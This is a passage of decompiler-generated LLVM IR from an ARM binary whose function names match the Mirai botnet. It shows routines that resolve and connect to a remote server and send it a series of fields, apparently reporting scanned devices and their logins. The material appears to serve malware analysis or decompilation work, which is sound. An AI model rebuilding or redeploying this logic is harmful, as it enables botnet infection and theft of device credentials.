  store i32 %v2_100f4, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_10210 = add i32 %v0_10120, 4
  %v2_10210 = inttoptr i32 %v1_10210 to i32*
  %v3_10210 = load i32, i32* %v2_10210, align 4
  %v4_10214 = call i32 @__libc_send(i32 %v3_10210, i32 %v2_100f4, i32 3, i32 16384)
  br label %dec_label_pc_faf4

dec_label_pc_10228:                               ; preds = %dec_label_pc_f70c
  store i32 %.pre, i32* @r0, align 4
  %v1_10230 = add i32 %v0_10228, 92
  store i32 %v1_10230, i32* @r1, align 4
  store i32 292, i32* @r2, align 4
  %v3_10238 = call i32 @memmove(i32 %.pre, i32 %v1_10230, i32 292)
  %v0_1023c = load i32, i32* @r6, align 4
  %v1_1023c = add i32 %v0_1023c, 24
  %v2_1023c = inttoptr i32 %v1_1023c to i32*
  %v3_1023c = load i32, i32* %v2_1023c, align 4
  %v1_10240 = add i32 %v3_1023c, -64
  store i32 %v1_10240, i32* %r3.global-to-local, align 4
  store i32 %v1_10240, i32* %v2_1023c, align 4
  br label %dec_label_pc_f71c

dec_label_pc_1024c:                               ; preds = %dec_label_pc_101c0
  %v0_1024c = load i32, i32* @r6, align 4
  store i32 %v0_1024c, i32* @r0, align 4
  %v0_10250 = call i32 @setup_connection()
  store i32 -1, i32* @r7, align 4
  br label %dec_label_pc_f954

dec_label_pc_1025c:                               ; preds = %dec_label_pc_f6c4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-60, align 4
  store i32 %v2_ee30, i32* %r3.global-to-local, align 4
  store i32 %v2_10060, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r1, align 4
  store i32 0, i32* %stack_var_-56, align 4
  %v5_10284 = call i32 @getsockopt(i32 %v3_f6b8, i32 1, i32 4, i32 %v2_ee30, i32 %v2_10060)
  %v3_10288 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_10288, i32* %r3.global-to-local, align 4
  %v2_1028c = or i32 %v3_10288, %v5_10284
  %v4_1028c = icmp eq i32 %v2_1028c, 0
  store i1 %v4_1028c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_1028c, label %dec_label_pc_10294, label %dec_label_pc_10320

dec_label_pc_10294:                               ; preds = %dec_label_pc_1025c
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_10298 = load i32, i32* @r6, align 4
  %v2_10298 = add i32 %v1_10298, 12
  %v3_10298 = inttoptr i32 %v2_10298 to i32*
  store i32 2, i32* %v3_10298, align 4
  %v0_1029c = call i32 @rand_next()
  %v2_102a4 = load i16, i16* bitcast (i16** @global_var_224b4.148 to i16*), align 4
  %v3_102a4 = zext i16 %v2_102a4 to i32
  %v3_102a8 = urem i32 %v0_1029c, %v3_102a4
  store i32 ptrtoint (i32* @global_var_22484.144 to i32), i32* %r3.global-to-local, align 4
  %v2_102b0 = load i32, i32* @global_var_22484.144, align 4
  store i32 %v2_102b0, i32* %ip.global-to-local, align 4
  %v1_102b8 = load i32, i32* @r4, align 4
  %v9_102b8 = icmp eq i32 %v2_102b0, %v1_102b8
  store i1 %v9_102b8, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_102a8, i32* %r1.global-to-local, align 4
  %v7_102c0 = icmp sgt i32 %v2_102b0, %v1_102b8
  br i1 %v7_102c0, label %dec_label_pc_102c4, label %dec_label_pc_102fc

dec_label_pc_102c4:                               ; preds = %dec_label_pc_10294
  %v2_102c8 = load i32, i32* @global_var_224b0.146, align 4
  store i32 %v2_102c8, i32* %r3.global-to-local, align 4
  store i32 %v1_102b8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_102d0

dec_label_pc_102d0:                               ; preds = %dec_label_pc_102ec, %dec_label_pc_102c4
  %v0_102ec = phi i32 [ %v1_102ec, %dec_label_pc_102ec ], [ %v1_102b8, %dec_label_pc_102c4 ]
  %v0_102f4 = phi i32 [ %v1_102f4, %dec_label_pc_102ec ], [ %v2_102c8, %dec_label_pc_102c4 ]
  %v1_102d4 = add i32 %v0_102f4, 8
  %v2_102d4 = inttoptr i32 %v1_102d4 to i16*
  %v3_102d4 = load i16, i16* %v2_102d4, align 2
  %v4_102d4 = zext i16 %v3_102d4 to i32
  store i32 %v4_102d4, i32* %r3.global-to-local, align 4
  %tmp459 = icmp ugt i32 %v4_102d4, %v3_102a8
  br i1 %tmp459, label %dec_label_pc_102ec, label %dec_label_pc_102e0

dec_label_pc_102e0:                               ; preds = %dec_label_pc_102d0
  %v1_102e0 = add i32 %v0_102f4, 10
  %v2_102e0 = inttoptr i32 %v1_102e0 to i16*
  %v3_102e0 = load i16, i16* %v2_102e0, align 2
  %v4_102e0 = zext i16 %v3_102e0 to i32
  store i32 %v4_102e0, i32* %r3.global-to-local, align 4
  %v3_102e4 = icmp uge i32 %v4_102e0, %v3_102a8
  %v9_102e4 = icmp eq i32 %v4_102e0, %v3_102a8
  %v2_102e8 = xor i1 %v9_102e4, true
  %v3_102e8 = and i1 %v3_102e4, %v2_102e8
  br i1 %v3_102e8, label %dec_label_pc_10300.loopexit, label %dec_label_pc_102ec

dec_label_pc_102ec:                               ; preds = %dec_label_pc_102e0, %dec_label_pc_102d0
  %v1_102ec = add i32 %v0_102ec, 1
  store i32 %v1_102ec, i32* %r2.global-to-local, align 4
  %v9_102f0 = icmp eq i32 %v1_102ec, %v2_102b0
  %v1_102f4 = add i32 %v0_102f4, 16
  store i32 %v1_102f4, i32* %r3.global-to-local, align 4
  br i1 %v9_102f0, label %dec_label_pc_102fc.loopexit, label %dec_label_pc_102d0

dec_label_pc_102fc.loopexit:                      ; preds = %dec_label_pc_102ec
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_102fc

dec_label_pc_102fc:                               ; preds = %dec_label_pc_102fc.loopexit, %dec_label_pc_10294
  br label %dec_label_pc_10300

dec_label_pc_10300.loopexit:                      ; preds = %dec_label_pc_102e0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v9_102e4, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10300

dec_label_pc_10300:                               ; preds = %dec_label_pc_10300.loopexit, %dec_label_pc_102fc
  %v0_10314 = phi i32 [ %v0_102f4, %dec_label_pc_10300.loopexit ], [ 0, %dec_label_pc_102fc ]
  %v0_10300 = load i32, i32* @r6, align 4
  %v1_10300 = add i32 %v0_10300, 4
  %v2_10300 = inttoptr i32 %v1_10300 to i32*
  %v3_10300 = load i32, i32* %v2_10300, align 4
  %v3_10304 = udiv i32 %v3_10300, 32
  store i32 %v3_10304, i32* %r2.global-to-local, align 4
  %v1_10308 = urem i32 %v3_10300, 32
  store i32 %v1_10308, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_1030c = mul nuw nsw i32 %v3_10304, 4
  store i32 %v3_1030c, i32* @ip, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_10314 = inttoptr i32 %v0_10300 to i32*
  store i32 %v0_10314, i32* %v2_10314, align 4
  %v0_10318 = load i32, i32* %r3.global-to-local, align 4
  %v1_10318 = load i32, i32* @r6, align 4
  %v2_10318 = add i32 %v1_10318, 24
  %v3_10318 = inttoptr i32 %v2_10318 to i32*
  store i32 %v0_10318, i32* %v3_10318, align 4
  %v0_f6ec.pre = load i32, i32* @ip, align 4
  %v1_f6f4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_f6e8

dec_label_pc_10320:                               ; preds = %dec_label_pc_1025c
  %v0_10320 = load i32, i32* @r6, align 4
  %v1_10320 = add i32 %v0_10320, 4
  %v2_10320 = inttoptr i32 %v1_10320 to i32*
  %v3_10320 = load i32, i32* %v2_10320, align 4
  %v1_10324 = call i32 @__GI___libc_close(i32 %v3_10320)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_1032c = load i32, i32* @r4, align 4
  %v1_1032c = load i32, i32* @r6, align 4
  %v2_1032c = add i32 %v1_1032c, 12
  %v3_1032c = inttoptr i32 %v2_1032c to i32*
  store i32 %v0_1032c, i32* %v3_1032c, align 4
  %v0_10330 = load i32, i32* %r3.global-to-local, align 4
  %v1_10330 = load i32, i32* @r6, align 4
  %v2_10330 = add i32 %v1_10330, 4
  %v3_10330 = inttoptr i32 %v2_10330 to i32*
  store i32 %v0_10330, i32* %v3_10330, align 4
  %v0_10334 = load i32, i32* @r4, align 4
  %v1_10334 = trunc i32 %v0_10334 to i8
  %v2_10334 = load i32, i32* @r6, align 4
  %v3_10334 = add i32 %v2_10334, 384
  %v4_10334 = inttoptr i32 %v3_10334 to i8*
  store i8 %v1_10334, i8* %v4_10334, align 1
  br label %dec_label_pc_f810

dec_label_pc_1033c:                               ; preds = %dec_label_pc_f90c
  store i32 %v2_f8bc, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v1_10348 = add i32 %v1_f928, 4
  %v2_10348 = inttoptr i32 %v1_10348 to i32*
  %v3_10348 = load i32, i32* %v2_10348, align 4
  store i32 %v3_10348, i32* @r4, align 4
  %v0_1034c = call i32 @rand_next()
  %v0_10350 = load i32, i32* @r5, align 4
  %v1_10350 = inttoptr i32 %v0_10350 to i8*
  %v2_10350 = load i8, i8* %v1_10350, align 1
  %v3_10350 = zext i8 %v2_10350 to i32
  %v3_10354 = urem i32 %v0_1034c, %v3_10350
  store i32 %v3_10354, i32* %r1.global-to-local, align 4
  %v0_10358 = load i32, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_10358 = mul nuw nsw i32 %v3_10354, 4
  %v5_10358 = add i32 %v0_10358, %v4_10358
  %v6_10358 = inttoptr i32 %v5_10358 to i32*
  %v7_10358 = load i32, i32* %v6_10358, align 4
  store i32 %v7_10358, i32* %r3.global-to-local, align 4
  %v0_10360 = load i32, i32* @sl, align 4
  store i32 %v0_10360, i32* %r1.global-to-local, align 4
  %v2_10368 = inttoptr i32 %v0_10360 to i32*
  %v3_10368 = call i32 @table_retrieve_val(i32 4, i32* %v2_10368)
  store i32 %v2_f8bc, i32* %ip.global-to-local, align 4
  %v0_10378 = load i32, i32* @r5, align 4
  %v1_1037c = call i32 @resolv_entries_free(i32 %v0_10378)
  %v1_10384 = call i32 @table_lock_val(i32 3)
  %v1_1038c = call i32 @table_lock_val(i32 4)
  %v0_10394 = load i32, i32* @r8, align 4
  store i32 %v2_10398, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_103a0 = call i32 @__libc_connect(i32 %v0_10394, i32 %v2_10398, i32 16)
  %v3_103a4 = icmp eq i32 %v3_103a0, -1
  store i1 %v3_103a4, i1* %cpsr_c.global-to-local, align 1
  %v8_103a4 = icmp eq i32 %v3_103a0, -1
  store i1 %v8_103a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_103a4, label %dec_label_pc_103ac, label %dec_label_pc_103bc

dec_label_pc_103ac:                               ; preds = %dec_label_pc_1033c
  %v0_103ac = load i32, i32* @r8, align 4
  %v1_103b0 = call i32 @__GI___libc_close(i32 %v0_103ac)
  %v0_103b4 = load i32, i32* @sl, align 4
  %v1_103b8 = call i32 @__GI_exit(i32 %v0_103b4)
  br label %dec_label_pc_103bc

dec_label_pc_103bc:                               ; preds = %dec_label_pc_1033c, %dec_label_pc_103ac
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v2_ee30, i32* %r1.global-to-local, align 4
  %v0_103c8 = load i32, i32* @r8, align 4
  %v0_103cc = load i32, i32* @sl, align 4
  store i32 %v0_103cc, i32* %stack_var_-56, align 4
  %v5_103d0 = call i32 @__libc_send(i32 %v0_103c8, i32 %v2_ee30, i32 1, i32 16384)
  store i32 %v2_10060, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_103e4 = load i32, i32* @r8, align 4
  %v4_103e8 = call i32 @__libc_send(i32 %v0_103e4, i32 %v2_10060, i32 4, i32 16384)
  store i32 %v2_103f0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_103fc = load i32, i32* @r8, align 4
  %v4_10400 = call i32 @__libc_send(i32 %v0_103fc, i32 %v2_103f0, i32 2, i32 16384)
  %v0_10404 = load i32, i32* @sb, align 4
  %v1_10404 = add i32 %v0_10404, 12
  store i32 %v1_10404, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10410 = load i32, i32* @r8, align 4
  %v4_10414 = call i32 @__libc_send(i32 %v0_10410, i32 %v1_10404, i32 1, i32 16384)
  %v0_10418 = load i32, i32* @sb, align 4
  %v1_10418 = inttoptr i32 %v0_10418 to i32*
  %v2_10418 = load i32, i32* %v1_10418, align 4
  store i32 %v2_10418, i32* %r1.global-to-local, align 4
  %v1_1041c = add i32 %v0_10418, 12
  %v2_1041c = inttoptr i32 %v1_1041c to i8*
  %v3_1041c = load i8, i8* %v2_1041c, align 1
  %v4_1041c = zext i8 %v3_1041c to i32
  store i32 %v4_1041c, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10424 = load i32, i32* @r8, align 4
  %v4_10428 = call i32 @__libc_send(i32 %v0_10424, i32 %v2_10418, i32 %v4_1041c, i32 16384)
  %v0_1042c = load i32, i32* @sb, align 4
  %v1_1042c = add i32 %v0_1042c, 13
  store i32 %v1_1042c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10438 = load i32, i32* @r8, align 4
  %v4_1043c = call i32 @__libc_send(i32 %v0_10438, i32 %v1_1042c, i32 1, i32 16384)
  %v0_10440 = load i32, i32* @r8, align 4
  %v0_10444 = load i32, i32* @sb, align 4
  %v1_10444 = add i32 %v0_10444, 13
  %v2_10444 = inttoptr i32 %v1_10444 to i8*
  %v3_10444 = load i8, i8* %v2_10444, align 1
  %v4_10444 = zext i8 %v3_10444 to i32
  store i32 %v4_10444, i32* %r2.global-to-local, align 4
  %v1_10448 = add i32 %v0_10444, 4
  %v2_10448 = inttoptr i32 %v1_10448 to i32*
  %v3_10448 = load i32, i32* %v2_10448, align 4
  store i32 %v3_10448, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10450 = call i32 @__libc_send(i32 %v0_10440, i32 %v3_10448, i32 %v4_10444, i32 16384)
  %v0_10454 = load i32, i32* @r8, align 4
  %v1_10458 = call i32 @__GI___libc_close(i32 %v0_10454)
  br label %dec_label_pc_1045c

dec_label_pc_1045c:                               ; preds = %dec_label_pc_f8f0, %dec_label_pc_103bc
  %v0_1045c = load i32, i32* @sl, align 4
  %v1_10460 = call i32 @__GI_exit(i32 %v0_1045c)
  br label %dec_label_pc_10464

dec_label_pc_10464.loopexit:                      ; preds = %dec_label_pc_fe7c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10464

dec_label_pc_10464:                               ; preds = %dec_label_pc_10464.loopexit, %dec_label_pc_1045c
  %v1_10468 = call i32 @table_lock_val(i32 30)
  %v0_1046c = load i32, i32* @r6, align 4
  %v1_1046c = add i32 %v0_1046c, 12
  %v2_1046c = inttoptr i32 %v1_1046c to i32*
  %v3_1046c = load i32, i32* %v2_1046c, align 4
  br label %dec_label_pc_f704.backedge

dec_label_pc_f704.backedge.thread:                ; preds = %dec_label_pc_f97c, %dec_label_pc_fb20, %dec_label_pc_fbf4, %dec_label_pc_fcc8, %dec_label_pc_fefc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f70c

dec_label_pc_f704.backedge.thread564:             ; preds = %dec_label_pc_fc58, %dec_label_pc_fb84, %dec_label_pc_ff60, %dec_label_pc_fda0, %dec_label_pc_f9e0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f70c

dec_label_pc_f704.backedge:                       ; preds = %dec_label_pc_f784, %dec_label_pc_10464, %dec_label_pc_10474
  %v0_f70c228 = phi i32 [ %v0_10484, %dec_label_pc_10474 ], [ %v0_1046c, %dec_label_pc_10464 ], [ %v0_f784, %dec_label_pc_f784 ]
  %v0_f704.be = phi i32 [ %v3_10484, %dec_label_pc_10474 ], [ %v3_1046c, %dec_label_pc_10464 ], [ %v3_f784, %dec_label_pc_f784 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f704 = icmp eq i32 %v0_f704.be, 0
  store i1 %v2_f704, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f704, label %dec_label_pc_f810, label %dec_label_pc_f70c

dec_label_pc_10474:                               ; preds = %dec_label_pc_100ac
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v1_10478 = call i32 @table_lock_val(i32 31)
  %v1_10480 = call i32 @table_lock_val(i32 32)
  %v0_10484 = load i32, i32* @r6, align 4
  %v1_10484 = add i32 %v0_10484, 12
  %v2_10484 = inttoptr i32 %v1_10484 to i32*
  %v3_10484 = load i32, i32* %v2_10484, align 4
  br label %dec_label_pc_f704.backedge

dec_label_pc_1048c:                               ; preds = %dec_label_pc_f7bc
  store i32 %v0_f320, i32* %r2.global-to-local, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 104, i32* %v2_f33c, align 4
  br label %dec_label_pc_f7d8

dec_label_pc_1049c:                               ; preds = %dec_label_pc_ee10
  store i32 ptrtoint (i32* @global_var_24fa0.155 to i32), i32* %r2.global-to-local, align 4
  %v2_104a0 = load i32, i32* @global_var_24fa0.155, align 4
  %v1_104a4 = call i32 @__GI___libc_close(i32 %v2_104a0)
  br label %dec_label_pc_104a8

dec_label_pc_104a8:                               ; preds = %dec_label_pc_edec, %dec_label_pc_1049c
  %v0_104a8 = load i32, i32* @r5, align 4
  %v1_104ac = call i32 @__GI_exit(i32 %v0_104a8)
  ret i32 %v1_104ac

; uselistorder directives
  uselistorder i32 %v0_10484, { 1, 0 }
  uselistorder i32 %v3_10300, { 1, 0 }
  uselistorder i32 %v1_102f4, { 1, 0 }
  uselistorder i32 %v1_102ec, { 1, 2, 0 }
  uselistorder i1 %v9_102e4, { 1, 0 }
  uselistorder i32 %v3_102a8, { 2, 1, 0, 3 }
  uselistorder i32 %v1_101d8, { 2, 1, 0 }
  uselistorder i32 %v0_10154.pr, { 1, 0 }
  uselistorder i32 %v0_10120, { 1, 2, 0 }
  uselistorder i32 %v4_100c0, { 1, 0 }
  uselistorder i1 %v7_1009c, { 1, 0 }
  uselistorder i32 %v1_10044, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_10044, { 0, 2, 1 }
  uselistorder i32 %v0_1003c, { 1, 0 }
  uselistorder i1 %v7_10038, { 1, 0 }
  uselistorder i1 %v7_10030, { 1, 0 }
  uselistorder i1 %v7_10028, { 1, 0 }
  uselistorder i1 %v8_10020, { 1, 0 }
  uselistorder i1 %v7_10004, { 1, 0 }
  uselistorder i1 %v7_fffc, { 1, 0 }
  uselistorder i1 %v7_fff4, { 1, 0 }
  uselistorder i1 %v8_ffec, { 1, 0 }
  uselistorder i32 %v1_ffd4, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_ff70, { 1, 0 }
  uselistorder i8 %v3_ff68, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_ff60, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_ff60, { 0, 2, 1 }
  uselistorder i32 %v0_ff58, { 1, 0 }
  uselistorder i1 %v7_ff54, { 1, 0 }
  uselistorder i1 %v7_ff4c, { 1, 0 }
  uselistorder i1 %v7_ff44, { 1, 0 }
  uselistorder i1 %v7_ff30, { 1, 0 }
  uselistorder i1 %v7_ff28, { 1, 0 }
  uselistorder i1 %v7_ff20, { 1, 0 }
  uselistorder i1 %v8_ff18, { 1, 0 }
  uselistorder i32 %v1_ff00, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v4_fea8, { 1, 0 }
  uselistorder i32 %v1_fe74, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_fe74, { 0, 2, 1 }
  uselistorder i32 %v0_fe6c, { 1, 0 }
  uselistorder i1 %v7_fe68, { 1, 0 }
  uselistorder i1 %v7_fe60, { 1, 0 }
  uselistorder i1 %v8_fe58, { 1, 0 }
  uselistorder i1 %v7_fe3c, { 1, 0 }
  uselistorder i1 %v7_fe34, { 1, 0 }
  uselistorder i1 %v8_fe2c, { 1, 0 }
  uselistorder i32 %v1_fe14, { 1, 2, 3, 4, 5, 0, 6, 7, 8 }
  uselistorder i1 %v8_fdb0, { 1, 0 }
  uselistorder i8 %v3_fda8, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_fda0, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_fda0, { 0, 2, 1 }
  uselistorder i32 %v0_fd98, { 1, 0 }
  uselistorder i1 %v7_fd94, { 1, 0 }
  uselistorder i1 %v7_fd8c, { 1, 0 }
  uselistorder i1 %v7_fd84, { 1, 0 }
  uselistorder i1 %v7_fcfc, { 1, 0 }
  uselistorder i1 %v7_fcf4, { 1, 0 }
  uselistorder i1 %v7_fcec, { 1, 0 }
  uselistorder i1 %v8_fce4, { 1, 0 }
  uselistorder i32 %v1_fccc, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_fc68, { 1, 0 }
  uselistorder i8 %v3_fc60, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_fc58, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_fc58, { 0, 2, 1 }
  uselistorder i32 %v0_fc50, { 1, 0 }
  uselistorder i1 %v7_fc4c, { 1, 0 }
  uselistorder i1 %v7_fc44, { 1, 0 }
  uselistorder i1 %v7_fc3c, { 1, 0 }
  uselistorder i1 %v7_fc28, { 1, 0 }
  uselistorder i1 %v7_fc20, { 1, 0 }
  uselistorder i1 %v7_fc18, { 1, 0 }
  uselistorder i1 %v8_fc10, { 1, 0 }
  uselistorder i32 %v1_fbf8, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_fb94, { 1, 0 }
  uselistorder i8 %v3_fb8c, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_fb84, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_fb84, { 0, 2, 1 }
  uselistorder i32 %v0_fb7c, { 1, 0 }
  uselistorder i1 %v7_fb78, { 1, 0 }
  uselistorder i1 %v7_fb70, { 1, 0 }
  uselistorder i1 %v7_fb68, { 1, 0 }
  uselistorder i1 %v7_fb54, { 1, 0 }
  uselistorder i1 %v7_fb4c, { 1, 0 }
  uselistorder i1 %v7_fb44, { 1, 0 }
  uselistorder i1 %v8_fb3c, { 1, 0 }
  uselistorder i32 %v1_fb24, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_fb10, { 1, 0 }
  uselistorder i32 %v1_fb08, { 1, 0 }
  uselistorder i32 %v1_fb00, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v3_fafc, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_fafc, { 0, 2, 1 }
  uselistorder i32 %v0_fadc.pr, { 1, 0 }
  uselistorder i32 %v0_fabc.pr, { 1, 0 }
  uselistorder i1 %v7_fa94, { 1, 0 }
  uselistorder i1 %v2_fa84, { 1, 0, 2 }
  uselistorder i1 %v2_fa68, { 1, 0, 2 }
  uselistorder i32 %v1_fa88, { 1, 2, 3, 0 }
  uselistorder i32 %v1_fa5c, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v2_fa8c, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1 %v8_f9f0, { 1, 0 }
  uselistorder i8 %v3_f9e8, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f9e0, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f9e0, { 0, 2, 1 }
  uselistorder i32 %v0_f9d8, { 1, 0 }
  uselistorder i1 %v7_f9d4, { 1, 0 }
  uselistorder i1 %v7_f9cc, { 1, 0 }
  uselistorder i1 %v7_f9c4, { 1, 0 }
  uselistorder i1 %v7_f9b0, { 1, 0 }
  uselistorder i1 %v7_f9a8, { 1, 0 }
  uselistorder i1 %v7_f9a0, { 1, 0 }
  uselistorder i1 %v8_f998, { 1, 0 }
  uselistorder i32 %v1_f980, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_f96c, { 1, 2, 0 }
  uselistorder i32 %v2_f958, { 1, 0 }
  uselistorder i32 %v0_f958, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v3_f954, { 2, 1, 4, 0, 5, 3 }
  uselistorder i1 %v7_f900, { 1, 0 }
  uselistorder i32 %v3_f8fc, { 1, 0, 2 }
  uselistorder i1 %v2_f8e8, { 1, 0 }
  uselistorder i32 %.464, { 1, 0 }
  uselistorder i1 %v7_f8d0, { 1, 0 }
  uselistorder i32 %v0_f8cc, { 2, 1, 0 }
  uselistorder i1 %v7_f8a4, { 1, 0 }
  uselistorder i32 %v0_f8a4, { 2, 1, 0, 3 }
  uselistorder i32 %v1_f814, { 2, 0, 3, 4, 5, 1 }
  uselistorder i1 %v1_f7f8, { 1, 0 }
  uselistorder i32 %v1_f7e8, { 2, 1, 0 }
  uselistorder i32 %v1_f7e4, { 1, 0 }
  uselistorder i32 %v0_f784, { 2, 5, 6, 20, 7, 8, 24, 9, 10, 21, 11, 12, 25, 13, 14, 22, 15, 16, 23, 4, 3, 19, 17, 18, 26, 27, 1, 0 }
  uselistorder i32 %v1_f760, { 1, 2, 3, 0 }
  uselistorder i32 %v3_f75c, { 1, 0 }
  uselistorder i32 %v4_f740, { 0, 4, 1, 2, 3, 5, 6 }
  uselistorder i32 %v2_f72c, { 1, 0, 2 }
  uselistorder i32 %v3_f728, { 1, 0, 2 }
  uselistorder i32 %v0_10228, { 1, 0, 2 }
  uselistorder i32 %v3_f6f0, { 1, 0 }
  uselistorder i32 %v1_f6d8, { 3, 2, 1, 0 }
  uselistorder i32 %v3_f6d4, { 1, 0 }
  uselistorder i32 %v3_f6cc, { 1, 2, 0 }
  uselistorder i1 %v7_f6bc, { 1, 0 }
  uselistorder i32 %v3_f6b8, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_f650, { 0, 1, 3, 2 }
  uselistorder i32 %v0_f650, { 0, 1, 3, 2 }
  uselistorder i32 %v0_f634, { 0, 2, 1 }
  uselistorder i32 %v1_f62c, { 1, 0 }
  uselistorder i32 %v1_f5ec, { 2, 1, 0 }
  uselistorder i32 %v1_f5e8, { 1, 0 }
  uselistorder i1 %v2_f5c8, { 1, 0, 2 }
  uselistorder i32 %v0_f5c4, { 1, 0, 2 }
  uselistorder i1 %v7_f590, { 0, 3, 4, 1, 2 }
  uselistorder i1 %v2_f590, { 1, 0, 2 }
  uselistorder i32 %v2_f588, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v1_f560, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_f554, { 0, 1, 3, 2 }
  uselistorder i32 %v0_f554, { 0, 2, 1 }
  uselistorder i32 %v3_f614, { 4, 7, 5, 6, 1, 0, 3, 2, 8 }
  uselistorder i32 %v1_f4a4, { 1, 0 }
  uselistorder i32 %v1_f48c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_f498, { 0, 3, 2, 1 }
  uselistorder i32 %v0_f440, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v5_f434, { 2, 1, 0 }
  uselistorder i32 %v1_f414, { 2, 0, 1, 3, 4 }
  uselistorder i1 %v2_f3f0, { 1, 0 }
  uselistorder i1 %v9_f3bc, { 1, 0 }
  uselistorder i32* %v2_f33c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_f320, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_f30c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v5_f254, { 1, 0 }
  uselistorder i32 %v3_f244, { 1, 2, 0, 3 }
  uselistorder i1 %v2_f17c, { 1, 0 }
  uselistorder i1 %v2_f168, { 1, 0 }
  uselistorder i1 %v2_f154, { 1, 0 }
  uselistorder i32 %.463, { 2, 1, 0 }
  uselistorder i1 %v7_f130, { 2, 1, 0, 5, 4, 3 }
  uselistorder i1 %v2_f118, { 1, 0 }
  uselistorder i1 %v3_f0fc, { 1, 0, 2 }
  uselistorder i1 %v2_f0e8, { 1, 0 }
  uselistorder i1 %v2_f0c4, { 1, 0 }
  uselistorder i32 %v1_f074, { 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 31, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
